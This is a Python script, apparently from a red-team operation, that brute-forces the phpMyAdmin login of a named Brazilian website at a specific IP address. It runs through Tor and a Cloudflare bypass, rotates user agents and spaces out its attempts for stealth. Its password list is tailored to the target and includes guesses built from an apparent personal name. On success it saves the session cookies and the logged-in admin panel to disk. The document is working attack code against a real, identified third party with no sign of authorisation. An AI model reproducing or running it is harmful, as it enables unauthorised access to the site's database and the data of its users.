#!/usr/bin/env python3
"""
phpMyAdmin 5.2.3 cred stuffing — desapegogames.com.br via bypass CF (.54)
Login form: POST /phpMyAdmin/index.php?route=/
Campos: pma_username, pma_password, server=1, token, set_session
Nao-destrutiva: apenas valida login (read-only proof).
"""
import sys, re, time, random, urllib3
import requests
urllib3.disable_warnings()

PROXY = {"https": "socks5h://127.0.0.1:9050", "http": "socks5h://127.0.0.1:9050"}
HOST = "https://186.226.60.54"
HOSTHEADER = "desapegogames.com.br"
BASE = f"{HOST}/phpMyAdmin/"

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
]

# Default MySQL root creds + target-specific guesses
PASSWORDS = [
    "", "root", "password", "mysql", "toor", "123456", "admin", "root123",
    "12345678", "admin123", "mysql123", "Password1", "p@ssw0rd", "qwerty",
    "password123", "abc123", "secret", "pass", "pass123", "rootpass",
    "rootpassword", "rootroot", "test", "1234", "12345", "root1234",
    "desapegogames", "desapego", "DesapegoGames", "desapegogames123",
    "desapego123", "Desapego@2024", "Desapego@2023", "Desapego@2022",
    "desapego2024", "desapego2023", "desapegogames2024",
    "Diego@2024", "diego123", "Diego2024", "diegobtrindade",
    "trindade", "Trindade123", "desapego!", "Desapego123",
    "P@ssw0rd", "Welcome1", "changeme", "default", "manager",
    "master", "123456789", "1234567890", "letmein", "123", "1",
]

def get_login_page(sess):
    """GET /phpMyAdmin/ → token, set_session, cookies."""
    h = {"Host": HOSTHEADER, "User-Agent": random.choice(UAS)}
    r = sess.get(BASE, headers=h, verify=False, timeout=30, allow_redirects=False)
    body = r.text
    m_tok = re.search(r'name="token"\s+value="([^"]+)"', body)
    m_ss = re.search(r'name="set_session"\s+value="([^"]+)"', body)
    token = m_tok.group(1) if m_tok else None
    set_session = m_ss.group(1) if m_ss else None
    return token, set_session, r

def try_login(sess, user, pw, token, set_session):
    """POST login. Retorna (status, location, body_len, has_error_msg, body_snippet)."""
    data = {
        "pma_username": user,
        "pma_password": pw,
        "server": "1",
        "token": token,
        "set_session": set_session,
    }
    h = {
        "Host": HOSTHEADER,
        "User-Agent": random.choice(UAS),
        "Referer": BASE,
        "Origin": HOST,
    }
    r = sess.post(f"{HOST}/phpMyAdmin/index.php?route=/",
                  headers=h, data=data, verify=False, timeout=30, allow_redirects=False)
    body = r.text
    # phpMyAdmin: login OK → 302 redirect to index.php?route=/&... (Location)
    #             login FAIL → 200 com msg "Access denied" / "Cannot log in"
    has_err = any(s in body for s in [
        "Access denied", "Cannot log in", "logged in", "Deny",
        "not allowed", "mysql_", "mysqli_real_connect",
    ])
    # Detectar painel logado: "Server: localhost" / "Navigation" / "Recent tables" / logout
    logged_in = (
        r.status_code in (302, 303) and ("Location" in r.headers)
        and "index.php" in r.headers.get("Location", "")
        and "route=/" in r.headers.get("Location", "")
        and "token=" in r.headers.get("Location", "")
    )
    # tambem pode retornar 200 com painel se cookies ja validos
    panel_signals = any(s in body for s in [
        "Server: localhost", "Server:", "Database:", "Navigation panel",
        "phpMyAdmin documentation", "Recent tables", "Log out",
        "Create database", "Database server", "General settings",
    ])
    return r.status_code, r.headers.get("Location", ""), len(body), has_err, body[:500], logged_in, panel_signals

def main():
    user = sys.argv[1] if len(sys.argv) > 1 else "root"
    out_log = "/home/ubuntu/red-team-operator/desapegogames.com.br/enum/phpmyadmin/credstuff_root.log"
    f = open(out_log, "w")
    def log(msg):
        print(msg, flush=True)
        f.write(msg + "\n"); f.flush()

    log(f"[*] phpMyAdmin cred stuffing — user={user} — {len(PASSWORDS)} passwords")
    log(f"[*] Target: {BASE} (Host: {HOSTHEADER}) via Tor SOCKS5")

    tried = 0
    for pw in PASSWORDS:
        tried += 1
        # nova sessao a cada tentativa (token + set_session frescos)
        sess = requests.Session()
        sess.proxies.update(PROXY)
        try:
            token, set_session, rg = get_login_page(sess)
            if not token or not set_session:
                log(f"  [{tried:02d}] FAIL parse token (HTTP {rg.status_code}) — retry")
                time.sleep(3)
                token, set_session, rg = get_login_page(sess)
                if not token:
                    log(f"  [{tried:02d}] SKIP (sem token) pw={pw!r}")
                    continue
            st, loc, blen, haserr, snip, logged, panel = try_login(sess, user, pw, token, set_session)
            tag = "OK?" if (logged or panel) else "fail"
            log(f"  [{tried:02d}] pw={pw!r:30s} → HTTP {st} loc={loc[:60]!r} len={blen} err={haserr} {tag}")
            if logged or panel:
                log(f"\n[+] **** LOGIN SUCCESS **** user={user!r} pw={pw!r}")
                log(f"[+] Location: {loc}")
                log(f"[+] Body snippet:\n{snip}")
                # salvar cookies
                with open("/home/ubuntu/red-team-operator/desapegogames.com.br/enum/phpmyadmin/session_ok_cookies.txt", "w") as cf:
                    for c in sess.cookies:
                        cf.write(f"{c.name}={c.value}; domain={c.domain}; path={c.path}\n")
                # proof read-only: pegar painel
                h = {"Host": HOSTHEADER, "User-Agent": random.choice(UAS)}
                rp = sess.get(f"{HOST}/phpMyAdmin/index.php?route=/{loc.split('?',1)[1] if '?' in loc else ''}",
                              headers=h, verify=False, timeout=30, allow_redirects=True)
                with open("/home/ubuntu/red-team-operator/desapegogames.com.br/enum/phpmyadmin/panel_after_login.html", "w") as pf:
                    pf.write(rp.text)
                log(f"[+] Panel saved ({len(rp.text)} bytes)")
                f.close()
                return 0, user, pw
        except Exception as e:
            log(f"  [{tried:02d}] EXC pw={pw!r}: {type(e).__name__}: {e}")
        # rate limit (Tor + stealth)
        time.sleep(random.uniform(1.5, 3.5))

    log(f"\n[-] Nenhuma cred funcionou para user={user}")
    f.close()
    return 1, user, None

if __name__ == "__main__":
    rc, user, pw = main()
    sys.exit(rc)
